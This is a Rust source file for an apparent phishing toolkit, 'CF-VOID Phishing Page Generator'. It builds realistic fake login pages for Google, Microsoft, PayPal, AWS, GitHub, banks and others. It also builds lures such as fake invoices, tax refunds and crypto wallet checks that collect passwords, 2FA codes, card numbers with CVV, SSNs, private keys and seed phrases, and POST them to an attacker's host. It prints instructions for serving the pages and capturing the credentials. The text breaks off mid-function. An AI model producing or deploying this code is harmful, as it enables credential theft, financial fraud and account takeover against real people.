// CF-VOID Phishing Page Generator
// Author: CYBER-FORCE
// Pre-created realistic phishing pages for multiple purposes and OS

use crate::cli::banner;
use std::fs;

pub mod email_templates;

pub use email_templates::{EmailTemplate, list_email_templates};

pub struct PhishingGen;

impl PhishingGen {
    pub fn new() -> Self {
        Self
    }

    pub fn generate(&self, template: &str, lhost: &str, lport: &str, output: Option<&str>) -> Option<String> {
        let out_dir = output.unwrap_or("phishing_pages");
        let _ = fs::create_dir_all(out_dir);

        let pages = match template.to_lowercase().as_str() {
            "login" => self.login_page(lhost, lport),
            "instagram" => self.instagram_page(lhost, lport),
            "facebook" => self.facebook_page(lhost, lport),
            "twitter" => self.twitter_page(lhost, lport),
            "github" => self.github_page(lhost, lport),
            "google" => self.google_page(lhost, lport),
            "microsoft" => self.microsoft_page(lhost, lport),
            "paypal" => self.paypal_page(lhost, lport),
            "netflix" => self.netflix_page(lhost, lport),
            "aws" => self.aws_page(lhost, lport),
            "docker" => self.docker_page(lhost, lport),
            "gitlab" => self.gitlab_page(lhost, lport),
            "slack" => self.slack_page(lhost, lport),
            "dropbox" => self.dropbox_page(lhost, lport),
            "adobe" => self.adobe_page(lhost, lport),
            "atlassian" => self.atlassian_page(lhost, lport),
            "vpn" => self.vpn_page(lhost, lport),
            "wifi" => self.wifi_page(lhost, lport),
            "router" => self.router_login_page(lhost, lport),
            // Social engineering templates
            "birthday" => self.birthday_page(lhost, lport),
            "love" => self.love_page(lhost, lport),
            "offer" => self.offer_page(lhost, lport),
            "card" => self.card_page(lhost, lport),
            "prize" => self.prize_page(lhost, lport),
            "wedding" => self.wedding_page(lhost, lport),
            "baby_shower" => self.baby_shower_page(lhost, lport),
            "christmas" => self.christmas_page(lhost, lport),
            "halloween" => self.halloween_page(lhost, lport),
            "valentine" => self.valentine_page(lhost, lport),
            "fathers_day" => self.fathers_day_page(lhost, lport),
            "mothers_day" => self.mothers_day_page(lhost, lport),
            "new_year" => self.new_year_page(lhost, lport),
            "thanksgiving" => self.thanksgiving_page(lhost, lport),
            "easter" => self.easter_page(lhost, lport),
            "resume" => self.resume_page(lhost, lport),
            "job_offer" => self.job_offer_page(lhost, lport),
            "invoice" => self.invoice_page(lhost, lport),
            "shipping" => self.shipping_page(lhost, lport),
            "tax" => self.tax_page(lhost, lport),
            "bank" => self.bank_page(lhost, lport),
            "crypto" => self.crypto_page(lhost, lport),
            "social_media" => self.social_media_page(lhost, lport),
            "cloud_storage" => self.cloud_storage_page(lhost, lport),
            "meeting" => self.meeting_page(lhost, lport),
            _ => {
                banner::error(&format!("Unknown template: {}. Use --list-templates to see available.", template));
                return None;
            }
        };

        let file_path = format!("{}/{}.html", out_dir, template);
        let _ = fs::write(&file_path, &pages);

        banner::success(&format!("Phishing page generated: {}/{}", out_dir, file_path));
        banner::info(&format!("Host with: python3 -m http.server {} --bind {}", lport, lhost));
        banner::info(&format!("Capture credentials at: http://{}:{}/{}", lhost, lport, template));

        Some(file_path)
    }

    pub fn list_templates() {
        banner::info("Available phishing templates:");
        let templates = [
            // Social Media
            ("Instagram", "Social media - login page"),
            ("Facebook", "Social media - login page"),
            ("Twitter", "Social media - login page"),
            ("GitHub", "Developer - login page"),
            ("GitLab", "Developer - login page"),
            ("Google", "Email - login page"),
            ("Microsoft", "Email - login page"),
            ("Slack", "Business - login page"),
            ("Dropbox", "File sharing - login page"),
            // Payments
            ("PayPal", "Payment - login page"),
            ("Netflix", "Streaming - login page"),
            ("Adobe", "Creative - login page"),
            ("Atlassian", "Business - login page"),
            // Cloud
            ("AWS", "Cloud - login page"),
            ("Docker", "DevOps - login page"),
            // Network
            ("VPN", "Network - login page"),
            ("WiFi", "Network - login page"),
            ("Router", "Network - admin page"),
            // Social Engineering
            ("Birthday", "Social - birthday invitation"),
            ("Love", "Social - love letter"),
            ("Offer", "Social - discount/offer"),
            ("Card", "Social - greeting card"),
            ("Prize", "Social - prize winner"),
            ("Wedding", "Social - wedding invitation"),
            ("Baby Shower", "Social - baby shower"),
            ("Christmas", "Social - holiday card"),
            ("Halloween", "Social - Halloween theme"),
            ("Valentine", "Social - Valentine's day"),
            ("Fathers Day", "Social - father's day card"),
            ("Mothers Day", "Social - mother's day card"),
            ("New Year", "Social - new year greeting"),
            ("Thanksgiving", "Social - Thanksgiving greeting"),
            ("Easter", "Social - Easter greeting"),
            // Professional/Business
            ("Resume", "Professional - resume submission"),
            ("Job Offer", "Professional - job offer"),
            ("Invoice", "Business - fake invoice"),
            ("Shipping", "Business - package delivery"),
            ("Tax", "Government - tax refund"),
            ("Bank", "Financial - bank alert"),
            ("Crypto", "Financial - crypto wallet"),
            ("Social Media", "Social - generic login"),
            ("Cloud Storage", "Business - shared file"),
            ("Meeting", "Professional - meeting invite"),
        ];

        for (name, desc) in &templates {
            banner::info(&format!("  {} - {}", name, desc));
        }
    }

     fn common_head(&self, title: &str) -> String {
        format!(r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; }}
        .container {{ max-width: 380px; margin: 40px auto; background: #fff; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); padding: 30px; }}
        .logo {{ text-align: center; margin-bottom: 20px; }}
        .logo img {{ width: 120px; }}
        h1 {{ font-size: 24px; color: #1a1a1a; margin-bottom: 20px; }}
        input[type="text"], input[type="password"], input[type="email"] {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }}
        button {{ width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 10px; }}
        button:hover {{ background: #0069d9; }}
        .footer {{ text-align: center; font-size: 12px; color: #999; margin-top: 20px; }}
        .error {{ color: #e74c3c; font-size: 12px; margin-top: 5px; }}
    </style>
</head>
<body>
<div class="container">
<div class="logo"><img src="logo.png" alt="{title}"></div>
<form method="POST" action="/capture">
<input type="hidden" name="target" value="{title}">
"#,
            title = title
        )
    }

    fn common_foot(&self) -> String {
        r#"</form>
<div class="footer">For authorized security testing only</div>
</div>
</body>
</html>"#.to_string()
    }

    fn instagram_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Instagram");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Instagram</h1>
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn facebook_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Facebook");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Facebook</h1>
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Log In</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn twitter_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Twitter");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Twitter / X</h1>
<input type="text" name="session[username_or_email]" placeholder="Phone, email, or username" required>
<input type="password" name="session[password]" placeholder="Password" required>
<button type="submit">Log in</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn github_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("GitHub");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>GitHub</h1>
<input type="text" name="login" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn google_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Google");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Google</h1>
<input type="email" name="identifier" placeholder="Enter your email" required>
<button type="submit" id="next">Next</button>
<input type="password" name="password" placeholder="Enter your password" style="display:none;" id="pw">
<button type="submit" style="display:none;" id="signin">Sign in</button>
<script>document.getElementById('next').addEventListener('click', function(e) {{
    e.preventDefault();
    document.getElementById('next').style.display = 'none';
    document.getElementById('pw').style.display = 'block';
    document.getElementById('signin').style.display = 'block';
}});
</script>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn microsoft_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Microsoft");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Microsoft</h1>
<input type="email" name="i0116595463" placeholder="Email, phone, or Skype" required>
<button type="submit">Next</button>
<input type="password" name="i0118812789" placeholder="Password" style="display:none;" id="pwd">
<button type="submit" style="display:none;" id="next2">Sign in</button>
<script>document.querySelector('input[type=email]').addEventListener('input', function() {{
    document.getElementById('pwd').style.display = 'block';
    document.getElementById('next2').style.display = 'block';
}});
</script>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn paypal_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("PayPal");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>PayPal</h1>
<input type="email" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn netflix_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Netflix");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Netflix</h1>
<input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn aws_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("AWS");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>AWS</h1>
<input type="text" name="username" placeholder="Username or root@example.com" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn docker_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Docker Hub");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Docker Hub</h1>
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn gitlab_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("GitLab");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>GitLab</h1>
<input type="text" name="username" placeholder="Username or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn slack_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Slack");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Slack</h1>
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn dropbox_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Dropbox");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Dropbox</h1>
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn adobe_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Adobe");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Adobe</h1>
<input type="email" name="email" placeholder="Email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn atlassian_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("Atlassian");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>Atlassian</h1>
<input type="text" name="username" placeholder="Email, username, or ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log in</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn vpn_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("VPN Login");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>VPN Portal</h1>
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<input type="text" name="otp" placeholder="Optional: 2FA Code" style="margin-top: 10px;">
<button type="submit">Connect</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn wifi_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.common_head("WiFi Login");
        let foot = self.common_foot();
        format!(r#"{head}
<h1>WiFi Portal</h1>
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
{foot}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, foot = foot, lhost = lhost, lport = lport)
    }

    fn router_login_page(&self, lhost: &str, lport: &str) -> String {
        let head = r#"<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Router Login</title>
<style>
body {{ font-family: Arial; background: #1a1a2e; color: #eee; height: 100vh; display: flex; align-items: center; justify-content: center; }}
.form {{ background: #16213e; padding: 30px; border-radius: 10px; width: 300px; }}
input {{ width: 100%; padding: 10px; margin: 5px 0; background: #0f3460; border: 1px solid #533483; color: #fff; }}
button {{ width: 100%; padding: 10px; background: #e94560; color: white; border: none; border-radius: 5px; }}
</style></head><body><div class="form"><h2>Router Admin Login</h2>
<form method="POST" action="/capture">
<input type="hidden" name="target" value="Router">
<input type="text" name="username" placeholder="Username" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Login</button>
</form></div></body></html>"#;
        format!(r#"{head}
<!-- Data captured to {lhost}:{lport} -->"#,
        head = head, lhost = lhost, lport = lport)
    }

    // ═══════════════════ SOCIAL ENGINEERING TEMPLATES ═══════════════════

    fn social_head(&self, title: &str) -> String {
        format!(r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }}
        .container {{ max-width: 420px; background: #fff; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.4); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%); padding: 30px; text-align: center; color: white; }}
        .header h1 {{ font-size: 26px; margin-bottom: 8px; }}
        .header p {{ font-size: 14px; opacity: 0.9; }}
        .content {{ padding: 30px; }}
        .form-group {{ margin-bottom: 18px; }}
        label {{ display: block; font-size: 13px; color: #555; margin-bottom: 5px; font-weight: 500; }}
        input, select, textarea {{ width: 100%; padding: 12px 14px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 15px; transition: border-color 0.3s; }}
        input:focus, select:focus, textarea:focus {{ outline: none; border-color: #ff6b6b; }}
        .btn {{ width: 100%; padding: 14px; background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }}
        .btn:hover {{ transform: translateY(-1px); }}
        .footer {{ text-align: center; padding: 15px; font-size: 12px; color: #999; }}
        .badge {{ display: inline-block; background: #4CAF50; color: white; padding: 3px 10px; border-radius: 12px; font-size: 11px; margin-left: 8px; }}
    </style>
</head>
<body>
<div class="container">
<div class="header">
    <h1>{title}</h1>
    <p>We'd love to see you participate!</p>
</div>
<div class="content">
<form method="POST" action="/capture">
<input type="hidden" name="target" value="{title}">"#,
        title = title
    )
    }

    fn social_form(&self, fields: &[(&str, &str)]) -> String {
        let mut html = String::new();
        for (label, name) in fields {
            html.push_str(&format!(r#"<div class="form-group">
    <label>{label}</label>
    <input type="text" name="{name}" placeholder="{label}" required>
</div>"#, label = label, name = name));
        }
        html
    }

    fn social_form_password(&self, label: &str, name: &str) -> String {
        format!(r#"<div class="form-group">
    <label>{label}</label>
    <input type="password" name="{name}" placeholder="●●●●●●●●" required>
</div>"#, label = label, name = name)
    }

    fn social_foot(&self) -> String {
        r#"</form>
</div>
<div class="footer">
    Secure Connection • SSL Encrypted • CF-VOID
</div>
</div>
</body>
</html>"#.to_string()
    }

    fn birthday_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🎉 Birthday Celebration!");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Your Email", "email"),
            ("Are you attending?", "attending"),
            ("Guest count", "guests"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- RSVP captured -->\n<!-- Data sent to {}:{}/birthday -->{}", head, form, lhost, lport, foot)
    }

    fn love_page(&self, lhost: &str, lport: &str) -> String {
        let page = format!(r#"<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {{ font-family: 'Georgia', serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }}
.card {{ background: white; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.15); max-width: 400px; margin: 20px; padding: 40px; text-align: center; }}
.heart {{ color: #ff4757; font-size: 48px; margin-bottom: 15px; }}
h1 {{ color: #2f354a; font-size: 24px; margin-bottom: 15px; }}
.message {{ font-size: 16px; color: #555; line-height: 1.6; margin-bottom: 20px; }}
input {{ width: 100%; padding: 12px; border: 2px solid #ffd700; border-radius: 10px; font-size: 15px; margin: 10px 0; text-align: center; }}
.btn {{ background: linear-gradient(135deg, #ff6b6b 0%, #ffa502 100%); color: white; border: none; padding: 12px 30px; border-radius: 25px; font-size: 16px; cursor: pointer; font-weight: 600; }}
</style></head><body>
<div class="card">
<div class="heart">💖 💌 💝</div>
<h1>A Special Message For You</h1>
<p class="message">My dearest one,<br><br>There's something I need to tell you.<br><br>Click below to read your special message.<br><br>With love, always. 💕</p>
<form method="POST" action="/capture">
<input type="hidden" name="target" value="Love Letter">
<input type="text" name="name" placeholder="Enter your name to continue" required>
<br><button type="submit" class="btn">Read My Message 💌</button>
</form>
</div>
</body></html>
<!-- Data captured to {}:{}/love -->"#, lhost, lport);
        page
    }

    fn offer_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🔥 Exclusive Offer Just For You!");
        let form = self.social_form(&[
            ("Full Name", "name"),
            ("Email Address", "email"),
            ("Phone Number", "phone"),
            ("Address", "address"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- Offer captured -->\n<!-- Data sent to {}:{}/offer -->{}", head, form, lhost, lport, foot)
    }

    fn card_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("💌 You've Received a Card!");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Your Email", "email"),
            ("Recipient Name", "recipient"),
        ]);
        let form_pass = self.social_form_password("Enter Password (if card is protected)", "password");
        let foot = self.social_foot();
        format!("{head}{form}{form_pass}{foot}<!-- Card opened -->\n<!-- Data to {lhost}:{lport}/card -->", head = head, form = form, form_pass = form_pass, foot = foot, lhost = lhost, lport = lport)
    }

    fn prize_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🎁 Congratulations! You've Won!");
        let form = self.social_form(&[
            ("Full Name", "name"),
            ("Email", "email"),
            ("Phone", "phone"),
            ("Shipping Address", "address"),
            ("City", "city"),
            ("State/Province", "state"),
            ("ZIP Code", "zip"),
            ("Country", "country"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- Prize claim -->\n<!-- Data to {}:{}/prize -->{}", head, form, lhost, lport, foot)
    }

    fn wedding_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("💍 Wedding Invitation");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Your Email", "email"),
            ("Attending?", "attending"),
            ("Number of Guests", "guests"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- RSVP -->\n<!-- Data to {}:{}/wedding -->{}", head, form, lhost, lport, foot)
    }

    fn baby_shower_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("👶 Baby Shower!");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Email", "email"),
            ("Attending?", "attending"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- RSVP -->\n<!-- Data to {}:{}/baby_shower -->{}", head, form, lhost, lport, foot)
    }

    fn christmas_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🎄 Merry Christmas!");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Email", "email"),
            ("Wish List Item", "wishlist"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- Christmas wish -->\n<!-- Data to {}:{}/christmas -->{}", head, form, lhost, lport, foot)
    }

    fn halloween_page(&self, lhost: &str, lport: &str) -> String {
        let page = format!(r#"<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {{ font-family: 'Creepster', cursive; background: #000; color: #f00; min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0; }}
.container {{ text-align: center; padding: 30px; border: 2px dashed #f00; border-radius: 15px; background: rgba(0,0,0,0.8); }}
h1 {{ font-size: 36px; text-shadow: 3px 3px 0 #fff; margin-bottom: 20px; }}
input {{ background: #330000; color: #ff0000; border: 1px solid #ff0000; padding: 10px; font-size: 15px; margin: 5px; border-radius: 5px; }}
.btn {{ background: #ff0000; color: #fff; border: none; padding: 12px 24px; font-size: 18px; cursor: pointer; border-radius: 5px; }}
</style></head><body>
<div class="container">
<h1>👻 BOO! 👻</h1>
<p>Trick or Treat!<br>Enter your info for a surprise!</p>
<form method="POST" action="/capture">
<input type="hidden" name="target" value="Halloween">
<input type="text" name="name" placeholder="Your Name" required><br>
<input type="text" name="email" placeholder="Your Email" required><br>
<button type="submit" class="btn">Submit 🎃</button>
</form>
</div>
</body></html>
<!-- Data captured to {}:{}/halloween -->"#, lhost, lport);
        page
    }

    fn valentine_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("💕 Valentine's Day Special");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Your Email", "email"),
            ("Your Crush's Name", "crush"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- Valentine -->\n<!-- Data to {}:{}/valentine -->{}", head, form, lhost, lport, foot)
    }

    fn fathers_day_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("👨‍👧 Father's Day Tribute");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Your Email", "email"),
            ("Father's Name", "father"),
            ("Message", "message"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- Father's Day -->\n<!-- Data to {}:{}/fathers_day -->{}", head, form, lhost, lport, foot)
    }

    fn mothers_day_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🌷 Mother's Day Special");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Your Email", "email"),
            ("Mother's Name", "mother"),
            ("Message", "message"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- Mother's Day -->\n<!-- Data to {}:{}/mothers_day -->{}", head, form, lhost, lport, foot)
    }

    fn new_year_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🎊 Happy New Year!");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Your Email", "email"),
            ("New Year Resolution", "resolution"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- New Year -->\n<!-- Data to {}:{}/new_year -->{}", head, form, lhost, lport, foot)
    }

    fn thanksgiving_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🦃 Thanksgiving Gratitude");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Your Email", "email"),
            ("What are you grateful for?", "grateful"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- Thanksgiving -->\n<!-- Data to {}:{}/thanksgiving -->{}", head, form, lhost, lport, foot)
    }

    fn easter_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🥚 Easter Celebration!");
        let form = self.social_form(&[
            ("Your Name", "name"),
            ("Your Email", "email"),
            ("Egg Hunt Location", "location"),
        ]);
        let foot = self.social_foot();
        format!("{}{}<!-- Easter -->\n<!-- Data to {}:{}/easter -->{}", head, form, lhost, lport, foot)
    }

    fn resume_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("📄 Job Application");
        let form = self.social_form(&[
            ("Full Name", "name"),
            ("Email", "email"),
            ("Phone", "phone"),
            ("Position Interested In", "position"),
            ("Years of Experience", "experience"),
        ]);
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Resume submission -->\n<!-- Data to {lhost}:{lport}/resume -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }

    fn job_offer_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("💼 Job Offer - Please Review");
        let form = self.social_form(&[
            ("Full Name", "name"),
            ("Email", "email"),
            ("Accept Offer?", "accept"),
            ("Expected Start Date", "start_date"),
            ("Salary Expectation", "salary"),
        ]);
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Job offer -->\n<!-- Data to {lhost}:{lport}/job_offer -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }

    fn invoice_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🧾 Invoice Payment Required");
        let form = self.social_form(&[
            ("Full Name", "name"),
            ("Email", "email"),
            ("Invoice #", "invoice"),
            ("Payment Method", "payment"),
            ("Card Number", "card"),
            ("Expiry Date", "expiry"),
            ("CVV", "cvv"),
        ]);
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Invoice payment -->\n<!-- Data to {lhost}:{lport}/invoice -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }

    fn shipping_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("📦 Package Delivery - Confirmation Needed");
        let form = self.social_form(&[
            ("Full Name", "name"),
            ("Email", "email"),
            ("Phone", "phone"),
            ("Delivery Address", "address"),
            ("City", "city"),
            ("ZIP Code", "zip"),
            ("Tracking Number", "tracking"),
        ]);
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Shipping confirmation -->\n<!-- Data to {lhost}:{lport}/shipping -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }

    fn tax_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🧾 Tax Refund - Immediate Action Required");
        let form = self.social_form(&[
            ("Full Name", "name"),
            ("SSN / Tax ID", "ssn"),
            ("Email", "email"),
            ("Bank Account", "account"),
            ("Routing Number", "routing"),
        ]);
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Tax refund -->\n<!-- Data to {lhost}:{lport}/tax -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }

    fn bank_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("🏦 Bank Security Alert");
        let form = self.social_form(&[
            ("Account Number", "account"),
            ("Username", "username"),
            ("Password", "password"),
            ("OTP / 2FA Code", "otp"),
        ]);
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Bank login -->\n<!-- Data to {lhost}:{lport}/bank -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }

    fn crypto_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("💰 Crypto Wallet Verification");
        let form = self.social_form(&[
            ("Wallet Address", "wallet"),
            ("Private Key", "private_key"),
            ("Seed Phrase", "seed"),
            ("Password", "password"),
        ]);
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Crypto wallet -->\n<!-- Data to {lhost}:{lport}/crypto -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }

    fn social_media_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("📱 Social Media - Verify Account");
        let form = self.social_form(&[
            ("Username", "username"),
            ("Email", "email"),
            ("Password", "password"),
        ]);
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Social media -->\n<!-- Data to {lhost}:{lport}/social_media -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }

    fn cloud_storage_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("☁️ Cloud Storage - Shared File");
        let form = self.social_form(&[
            ("Your Email", "email"),
            ("Your Name", "name"),
            ("Password to decrypt file", "password"),
        ]);
        let foot = self.social_foot();
        format!("{head}{form}{foot}<!-- Cloud storage -->\n<!-- Data to {lhost}:{lport}/cloud_storage -->", head = head, form = form, foot = foot, lhost = lhost, lport = lport)
    }

    fn meeting_page(&self, lhost: &str, lport: &str) -> String {
        let head = self.social_head("📅 Meeting Invitation");
